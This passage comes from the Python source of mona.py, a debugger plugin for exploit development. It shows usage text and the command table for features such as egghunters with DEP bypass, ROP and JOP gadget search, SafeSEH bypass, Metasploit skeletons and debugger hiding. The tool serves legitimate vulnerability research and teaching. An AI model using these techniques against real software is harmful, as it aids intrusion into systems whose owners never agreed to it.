        bytearrayUsage = "Creates a byte array, can be used to find bad characters\nOptional arguments :\n    -cpb <bytes> : bytes to exclude from the array. Example : '\\x00\\x0a\\x0d'\n                   Note: you can specify wildcards using .. \n                   Example: '\\x00\\x0a..\\x20\\x32\\x7f..\\xff'\n    -s : optional starting hex, example: '\\x7f'\n    -e : optional ending hex, example: '\\xff'\n         Example: -s \\x01 -e \\x7f to have all bytes from 0x01 to 0x7f\n                  -s \\xff -e \\x7f to have all bytes from 0xff to 0x7f in reverse\n    -r : show array backwards (reversed), starting at \\xff\n    Output will be written to bytearray.txt, and binary output will be written to bytearray.bin"
        headerUsage = "Convert contents of a binary file to code that can be run to produce the file\nMandatory argument :\n    -f <filename> : source filename\nOptional argument:\n    -t <type>     : specify type of output. Valid choices are 'ruby' (default) or 'python' "
        updateUsage = 'Update mona to the latest version'
        getpcUsage = 'Find getpc routine for specific register\nMandatory argument :\n    -r : register (ex: eax)'
        eggUsage = 'Creates an egghunter routine\nOptional arguments :\n    -t : tag (ex: w00t). Default value is w00t\n    -c : enable checksum routine. Only works in conjunction with parameter -f\n    -f <filename> : file containing the shellcode\n    -startreg <reg> : start searching at the address pointed by this reg\n    -wow64 : generate wow64 egghunter (Win7 and Win10). Default is traditional 32bit egghunter\n    -winver <ver> : indicate Windows version for wow64 egghunter. Default is Windows 10. \n                    valid values are 7 and 10.\t\nDEP Bypass options :\n    -depmethod <method> : method can be "virtualprotect", "copy" or "copy_size"\n    -depreg <reg> : sets the register that contains a pointer to the API function to bypass DEP. \n                    By default this register is set to ESI\n    -depsize <value> : sets the size for the dep bypass routine\n    -depdest <reg> : this register points to the location of the egghunter itself.  \n                     When bypassing DEP, the egghunter is already marked as executable. \n                     So when using the copy or copy_size methods, the DEP bypass in the egghunter \n                     would do a "copy 2 self".  In order to be able to do so, it needs a register \n                     where it can copy the shellcode to. \n                     If you leave this empty, the code will contain a GetPC routine.'
        stacksUsage = 'Shows all stacks for each thread in the running application'
        skeletonUsage = 'Creates a Metasploit exploit module skeleton for a specific type of exploit\nMandatory argument in case you are using WinDBG:\n    -t <type:arg> : skeletontype. Valid types are :\n                tcpclient:port, udpclient:port, fileformat:extension\n                Examples : -t tcpclient:21\n                           -t fileformat:pdf\nOptional arguments :\n    -s : size of the cyclic pattern (default : 5000)\n'
        heapUsage = "Show information about various heap chunk lists\nMandatory arguments :\n    -h <address> : base address of the heap to query\n    -t <type> : where type is 'segments', 'chunks', 'layout',\n                'fea' (let mona determine the frontend allocator),\n                'lal' (force display of LAL FEA, only on XP/2003),\n                'lfh' (force display of LFH FEA (Vista/Win7/...)),\n                'bea' (backend allocator, mona will automatically determine what it is),\n                'all' (show all information)\n    Note: 'layout' will show all heap chunks and their vtables & strings. Use on WinDBG for maximum results.\nOptional arguments :\n    -expand : Works only in combination with 'layout', will include VA/LFH/... chunks in the search.\n              VA/LFH chunks may be very big, so this might slow down the search.\n    -stat : show statistics (also works in combination with -h heap, -t segments or -t chunks\n    -size <nr> : only show strings of at least the specified size. Works in combination with 'layout'\n    -after <data> : only show current & next chunk layout entries when an entry contains this data\n                    (Only works in combination with 'layout')\n    -v : show data / write verbose info to the Log window"
        getiatUsage = 'Show IAT entries from selected module(s)\nOptional arguments :\n    -s <keywords> : only show IAT entries that contain one of these keywords'
        geteatUsage = 'Show EAT entries from selected module(s)\nOptional arguments :\n    -s <keywords> : only show EAT entries that contain one of these keywords'
        deferUsage = 'Set a deferred breakpoint\nMandatory arguments :\n    -a <target>,<target>,... \n    target can be an address, a modulename.functionname or module.dll+offset (hex value)\n    Warning, modulename.functionname is case sensitive !\n\t'
        calltraceUsage = 'Logs all CALL instructions\nMandatory arguments :\n    -m module : specify what module to search for CALL instructions (global option)\t\nOptional arguments :\n    -a <number> : number of arguments to show for each CALL\n    -r : also trace RETN instructions (will slow down process!)'
        fillchunkUsage = "Fills a heap chunk, referenced by a register, with A's (or another character)\nMandatory arguments :\n    -r <reg/reference> : reference to heap chunk to fill\nOptional arguments :\n    -b <character or byte to use to fill up chunk>\n    -s <size> : if the referenced chunk is not found, and a size is defined with -s,\n                memory will be filled anyway, up to the specified size"
        getpageACLUsage = 'List all mapped pages and show the ACL associated with each page\nOptional arguments : \n    -a <address> : only show page information around this address.\n                   (Page before, current page and page after will be displayed)'
        bpsehUsage = 'Sets a breakpoint on all current SEH Handler function pointers'
        kbUsage = "Manage knowledgebase data\nMandatory arguments:\n    -<type> : type can be 'list', 'set' or 'del'\n    To 'set' ( = add / update ) a KB entry, or 'del' an entry, \n    you will need to specify 2 additional arguments:\n        -id <id> : the Knowledgebase ID\n        -value <value> : the value to add/update.  In case of lists, use a comma to separate entries.\n    The -list parameter will show all current ID's\n    To see the contents of a specific ID, use the -id <id> parameter."
        macroUsage = "Manage macros for WinDBG\nArguments:\n    -run <macroname> : run the commands defined in the specified macro\n    -show <macroname> : show all commands defined in the specified macro\n    -add <macroname> : create a new macro\n    -set <macroname> -index <nr> -cmd <windbg command(s)> : edit a macro\n               If you set the -command value to #, the command at the specified index\n               will be removed.  If you have specified an existing index, the command \n               at that position will be replaced, unless you've also specified the -insert parameter.\n               If you have not specified an index, the command will be appended to he list.\n    -set <macroname> -file <filename> : will tell this macro to execute all instructions in the\n               specified file. You can only enter one file per macro.\n    -del <macroname> -iamsure: remove the specified macro. Use with care, I won't ask if you're sure."
        sehchainUsage = 'Displays the SEH chain for the current thread.\nThis command will also attempt to display offsets and suggest a payload structure\nin case a cyclic pattern was used to overwrite the chain.'
        heapCookieUsage = 'Will attempt to find reliable writeable pointers that can help avoiding\na heap cookie check during an arbitrary free on Windows XP'
        hidedebugUsage = 'Will attempt to hide the debugger from the process'
        gflagsUsage = 'Will show the currently set GFlags, based on the PEB.NtGlobalFlag value'
        fwptrUsage = 'Search for calls to pointers in a writeable location, \nwill assist with finding a good target for 4byte arbitrary writes\nOptional arguments:\n    -bp : Set breakpoints on all found CALL instructions\n    -patch : Patch the target of each CALL with 0x41414141\n    -chunksize <nr> : only list the pointer if location-8 bytes contains a size value larger than <nr>\n                      (size in blocks, not bytes)\n    -offset <nr> : add <nr> bytes of offset within chunk, after flink/blink pointer \n                  (use in combination with -freelist and -chunksize <nr>)\n    -freelist : Search for fwptr that are preceeded by 2 readable pointers that can act as flink/blink'
        allocmemUsage = "Allocate RWX memory in the debugged process.\nOptional arguments:\n    -s <size>    : desired size of allocated chunk. VirtualAlloc will allocate at least 0x1000 bytes,\n                   but this size argument is only useful when used in combination with -fill.\n    -a <address> : desired target location for allocation, set to start of chunk to allocate.\n    -acl <level> : overrule default RWX memory protection.\n    -fill        : fill 'size' bytes (-s) of memory at specified address (-a) with A's.\n    -force       : use in combination with -fill, in case page was already mapped but you still want to\n                   fill the chunk at the desired location.\n    -b <byte>    : Specify what byte to write to the desired location. Defaults to '\\x41'    \n"
        changeaclUsage = 'Change the ACL of a given page.\nArguments:\n    -a <address>   : Address belonging to the page that needs to be changed\n    -acl <level>   : New ACL. Valid values are R,RW,RXW,RX,N,GUARD,NOCACHE,WC'
        infodumpUsage = "Dumps contents of memory to file. Contents will include all pages that don't\nbelong to stack, heap or loaded modules.\nOutput will be written to infodump.xml"
        pebUsage = 'Show the address of the Process Environment Block (PEB)'
        tebUsage = 'Show the address of the Thread Environment Block (TEB) for the current thread'
        jsehUsage = "(look for jmp/call dword ptr[ebp/esp+nn and ebp-nn] + add esp,8+ret) \nOnly addresses outside address range of modules will be listed unless parameter '-all' is given. \nIn that case, all addresses will be listed. TRY THIS ONE !"
        encUsage = 'Encode a series of bytes\nArguments:\n    -t <type>         : Type of encoder to use.  Allowed value(s) are alphanum \n    -s <bytes>        : The bytes to encode (or use -f instead)\n    -f <path to file> : The full path to the binary file that contains the bytes to encode'
        stringUsage = 'Read a string from memory or write a string to memory\nArguments:\n    -r                : Read a string, use in combination with -a\n    -w                : Write a string, use in combination with -a and -s\n    -noterminate      : Do not terminate the string (using in combination with -w)\n    -u                : use UTF-16 (Unicode) mode\n    -s <string>       : The string to write\n    -a <address>      : The location to read from or write to'
        unicodealignUsage = "Generates a venetian shellcode alignment stub which can be placed directly before unicode shellcode.\n\nArguments:\n    -a <address>      : Specify the address where the alignment code will start/be placed\n                      : If -a is not specified, the current value in EIP will be used.\n    -l                : Prepend alignment with a null byte compensating nop equivalent\n                        (Use this if the last instruction before the alignment routine 'leaks' a null byte)\n    -b <reg>          : Set the bufferregister, defaults to eax\n    -t <seconds>      : Time in seconds to run heuristics (defaults to 15)\n    -ebp <value>      : Overrule the use of the 'current' value of ebp, \n                        ebp/address will be used to calculate offset to shellcode"
        copyUsage = 'Copies bytes from one location to another.\n\nArguments:\n    -src <address>    : The source address\n    -dst <address>    : The destination address\n    -n <number>       : The number of bytes to copy'
        dumpobjUsage = 'Dump the contents of an object.\n\nArguments:\n    -a <address>      : Address of object\n    -s <number>       : Size of object (default value: 0x28 or size of chunk)\nOptional arguments:\n    -l <number>       : Recursively dump objects\n    -m <number>       : Size for recursive objects (default value: 0x28)\n'
        dumplogUsage = "Dump all objects recorded in an alloc/free log\nNote: dumplog will only dump objects that have not been freed in the same logfile.\nExpected syntax for log entries:\n    Alloc : 'alloc(size in hex) = address'\n    Free  : 'free(address)'\nAdditional text after the alloc & free info is fine.\nJust make sure the syntax matches exactly with the examples above.\nArguments:\n    -f <path/to/logfile> : Full path to the logfile\nOptional arguments:\n    -l <number>       : Recursively dump objects\n    -m <number>       : Size for recursive objects (default value: 0x28)\n    -s <number>       : Only take allocated chunks of this exact size into consideration\n    -nofree           : Ignore all free() events, show all allocations (including those that were freed)"
        tobpUsage = 'Generate WinDBG syntax to set a logging breakpoint at a given location\nArguments:\n    -a <address>      : Location (address, register) for logging breakpoint\nOptional arguments:\n    -e                : Execute breakpoint command right away'
        flowUsage = "Simulates execution flows from current location (EIP), tries all conditional jump combinations\nOptional arguments:\n    -e <address>                 : Show execution flows that will reach specified address\n    -avoid <address,address,...> : Only show paths that don't contain any of the pointers to avoid\n    -n <nr>                      : Max nr of instructions, default: 60\n    -cl <nr>                     : Max level of CALL to follow in detail, default: 3\n    -cs <nr>                     : Don't show details of first <nr> CALL/child functions. default: 0\n    -func                        : Show function names (slows down process)."
        evalUsage = "Evaluates an expression\nArguments:\n    <the expression to evaluate>\n\nAccepted syntax includes: \n    hex values, decimal values (prefixed with 0n), registers, \n    module names, 'heap' ( = address of default process heap),\n    module!functionname\n    simple math operations"
        diffheapUsage = 'Compare current heap layout with previously saved state\nArguments:\n    -save     : save current state to disk \n    -diff     : compare current state with previously saved state'
        commands['seh'] = MnCommand('seh', 'Find pointers to assist with SEH overwrite exploits', sehUsage, procFindSEH)
        commands['config'] = MnCommand('config', 'Manage configuration file (mona.ini)', configUsage, procConfig, 'conf')
        commands['jmp'] = MnCommand('jmp', 'Find pointers that will allow you to jump to a register', jmpUsage, procFindJMP, 'j')
        commands['ropfunc'] = MnCommand('ropfunc', 'Find pointers to pointers (IAT) to interesting functions that can be used in your ROP chain', ropfuncUsage, procFindROPFUNC)
        commands['rop'] = MnCommand('rop', 'Finds gadgets that can be used in a ROP exploit and do ROP magic with them', ropUsage, procROP)
        commands['jop'] = MnCommand('jop', 'Finds gadgets that can be used in a JOP exploit', jopUsage, procJOP)
        commands['jseh'] = MnCommand('jseh', 'Finds gadgets that can be used to bypass SafeSEH', jsehUsage, procJseh)
        commands['stackpivot'] = MnCommand('stackpivot', 'Finds stackpivots (move stackpointer to controlled area)', stackpivotUsage, procStackPivots)
        commands['modules'] = MnCommand('modules', 'Show all loaded modules and their properties', modulesUsage, procShowMODULES, 'mod')
        commands['filecompare'] = MnCommand('filecompare', 'Compares 2 or more files created by mona using the same output commands', filecompareUsage, procFileCOMPARE, 'fc')
        commands['pattern_create'] = MnCommand('pattern_create', 'Create a cyclic pattern of a given size', patcreateUsage, procCreatePATTERN, 'pc')
        commands['pattern_offset'] = MnCommand('pattern_offset', 'Find location of 4 bytes in a cyclic pattern', patoffsetUsage, procOffsetPATTERN, 'po')
        commands['find'] = MnCommand('find', 'Find bytes in memory', findUsage, procFind, 'f')
        commands['findwild'] = MnCommand('findwild', 'Find instructions in memory, accepts wildcards', findwildUsage, procFindWild, 'fw')
        commands['assemble'] = MnCommand('assemble', 'Convert instructions to opcode. Separate multiple instructions with #', assembleUsage, procAssemble, 'asm')
        commands['info'] = MnCommand('info', 'Show information about a given address in the context of the loaded application', infoUsage, procInfo)
        commands['dump'] = MnCommand('dump', 'Dump the specified range of memory to a file', dumpUsage, procDump)
        commands['offset'] = MnCommand('offset', 'Calculate the number of bytes between two addresses', offsetUsage, procOffset)
        commands['compare'] = MnCommand('compare', 'Compare a file created by msfvenom/gdb/hex/xxd/hexdump/ollydbg with a copy in memory', compareUsage, procCompare, 'cmp')
        commands['breakpoint'] = MnCommand('bp', 'Set a memory breakpoint on read/write or execute of a given address', bpUsage, procBp, 'bp')
        commands['nosafeseh'] = MnCommand('nosafeseh', 'Show modules that are not safeseh protected', nosafesehUsage, procModInfoS)
        commands['nosafesehaslr'] = MnCommand('nosafesehaslr', 'Show modules that are not safeseh protected, not aslr and not rebased', nosafesehaslrUsage, procModInfoSA)
        commands['noaslr'] = MnCommand('noaslr', 'Show modules that are not aslr or rebased', noaslrUsage, procModInfoA)
        commands['findmsp'] = MnCommand('findmsp', 'Find cyclic pattern in memory', findmspUsage, procFindMSP, 'findmsf')
        commands['suggest'] = MnCommand('suggest', 'Suggest an exploit buffer structure', suggestUsage, procSuggest)
        commands['bytearray'] = MnCommand('bytearray', 'Creates a byte array, can be used to find bad characters', bytearrayUsage, procByteArray, 'ba')
        commands['header'] = MnCommand('header', "Read a binary file and convert content to a nice 'header' string", headerUsage, procPrintHeader)
        commands['update'] = MnCommand('update', 'Update mona to the latest version', updateUsage, procUpdate, 'up')
        commands['getpc'] = MnCommand('getpc', 'Show getpc routines for specific registers', getpcUsage, procgetPC)
        commands['egghunter'] = MnCommand('egghunter', 'Create egghunter code', eggUsage, procEgg, 'egg')
        commands['stacks'] = MnCommand('stacks', 'Show all stacks for all threads in the running application', stacksUsage, procStacks)
        commands['skeleton'] = MnCommand('skeleton', 'Create a Metasploit module skeleton with a cyclic pattern for a given type of exploit', skeletonUsage, procSkeleton)
        commands['breakfunc'] = MnCommand('breakfunc', "Set a breakpoint on an exported function in on or more dll's", bfUsage, procBf, 'bf')
        commands['heap'] = MnCommand('heap', 'Show heap related information', heapUsage, procHeap)
        commands['getiat'] = MnCommand('getiat', 'Show IAT of selected module(s)', getiatUsage, procGetIAT, 'iat')
        commands['geteat'] = MnCommand('geteat', 'Show EAT of selected module(s)', geteatUsage, procGetEAT, 'eat')
        commands['pageacl'] = MnCommand('pageacl', 'Show ACL associated with mapped pages', getpageACLUsage, procPageACL, 'pacl')
        commands['bpseh'] = MnCommand('bpseh', 'Set a breakpoint on all current SEH Handler function pointers', bpsehUsage, procBPSeh, 'sehbp')
        commands['kb'] = MnCommand('kb', 'Manage Knowledgebase data', kbUsage, procKb, 'kb')
        commands['encode'] = MnCommand('encode', 'Encode a series of bytes', encUsage, procEnc, 'enc')
        commands['unicodealign'] = MnCommand('unicodealign', 'Generate venetian alignment code for unicode stack buffer overflow', unicodealignUsage, procUnicodeAlign, 'ua')
        if (__DEBUGGERAPP__ == 'Immunity Debugger'):
            commands['deferbp'] = MnCommand('deferbp', 'Set a deferred breakpoint', deferUsage, procBu, 'bu')
            commands['calltrace'] = MnCommand('calltrace', 'Log all CALL instructions', calltraceUsage, procCallTrace, 'ct')
        if (__DEBUGGERAPP__ == 'WinDBG'):
            commands['fillchunk'] = MnCommand('fillchunk', 'Fill a heap chunk referenced by a register', fillchunkUsage, procFillChunk, 'fchunk')
            commands['dumpobj'] = MnCommand('dumpobj', 'Dump the contents of an object', dumpobjUsage, procDumpObj, 'do')
            commands['dumplog'] = MnCommand('dumplog', 'Dump objects present in alloc/free log file', dumplogUsage, procDumpLog, 'dl')
            commands['changeacl'] = MnCommand('changeacl', 'Change the ACL of a given page', changeaclUsage, procChangeACL, 'ca')
            commands['allocmem'] = MnCommand('allocmem', 'Allocate some memory in the process', allocmemUsage, procAllocMem, 'alloc')
            commands['tobp'] = MnCommand('tobp', 'Generate WinDBG syntax to create a logging breakpoint at given location', tobpUsage, procToBp, '2bp')
            commands['flow'] = MnCommand('flow', 'Simulate execution flows, including all branch combinations', flowUsage, procFlow, 'flw')
        commands['fwptr'] = MnCommand('fwptr', 'Find Writeable Pointers that get called', fwptrUsage, procFwptr, 'fwp')
        commands['sehchain'] = MnCommand('sehchain', 'Show the current SEH chain', sehchainUsage, procSehChain, 'exchain')
        commands['hidedebug'] = MnCommand('hidedebug', 'Attempt to hide the debugger', hidedebugUsage, procHideDebug, 'hd')
        commands['gflags'] = MnCommand('gflags', 'Show current GFlags settings from PEB.NtGlobalFlag', gflagsUsage, procFlags, 'gf')
        commands['infodump'] = MnCommand('infodump', 'Dumps specific parts of memory to file', infodumpUsage, procInfoDump, 'if')
        commands['peb'] = MnCommand('peb', 'Show location of the PEB', pebUsage, procPEB, 'peb')
        commands['teb'] = MnCommand('teb', 'Show TEB related information', tebUsage, procTEB, 'teb')
        commands['string'] = MnCommand('string', 'Read or write a string from/to memory', stringUsage, procString, 'str')
        commands['copy'] = MnCommand('copy', 'Copy bytes from one location to another', copyUsage, procCopy, 'cp')
        commands['?'] = MnCommand('?', 'Evaluate an expression', evalUsage, procEval, 'eval')
        opts = {}
        last = ''
        arguments = []
        argcopy = copy.copy(args)
        aline = ' '.join((a for a in argcopy))
        if (__DEBUGGERAPP__ == 'WinDBG'):
            aline = ('!py ' + aline)
        else:
            aline = ('!mona ' + aline)
        dbg.log('[+] Command used:')
        dbg.log(('%s' % aline))
        if ('-showargs' in args):
            dbg.log(('-' * 50))
            dbg.log(('args: %s' % args))
        if (len(args) > 0):
            if (args[0].lower().startswith('mona') or args[0].lower().endswith('mona') or args[0].lower().endswith('mona.py')):
                args.pop(0)
        if (len(args) >= 2):
            arguments = args[1:]
        if ('-showargs' in args):
            dbg.log(('arguments: %s' % arguments))
        for word in arguments:
            if (word[0] == '-'):
                word = word.lstrip('-')
                opts[word] = True
                last = word
            elif (last != ''):
                if (str(opts[last]) == 'True'):
                    opts[last] = word
                else:
                    opts[last] = ((opts[last] + ' ') + word)
        if ((len(args) > 1) and (args[1][0] != '-')):
            opts['?'] = args[1]
        if (len(args) < 1):
            commands['help'].parseProc(opts)
            return ''
        command = args[0]
        if ('-showargs' in args):
            dbg.log(('command: %s' % command))
            dbg.log(('-' * 50))
            args.remove('-showargs')
            arguments.remove('-showargs')
        if (command in commands):
            if (command.lower().strip() == 'help'):
                commands[command].parseProc(args)
            else:
                commands[command].parseProc(opts)
        else:
            aliasfound = False
            for cmd in commands:
                if (commands[cmd].alias == command):
                    commands[cmd].parseProc(opts)
                    aliasfound = True
            if (not aliasfound):
                commands['help'].parseProc(None)
                return '** Invalid command **'
        endtime = datetime.datetime.now()
        delta = (endtime - starttime)
        dbg.log('')
        dbg.log(('[+] This mona.py action took %s' % str(delta)))
        dbg.setStatusBar('Done')
    except:
        dbg.log(('*' * 80), highlight=True)
        dbg.logLines(traceback.format_exc(), highlight=True)
        dbg.log(('*' * 80), highlight=True)
        dbg.error(traceback.format_exc())
    return ''
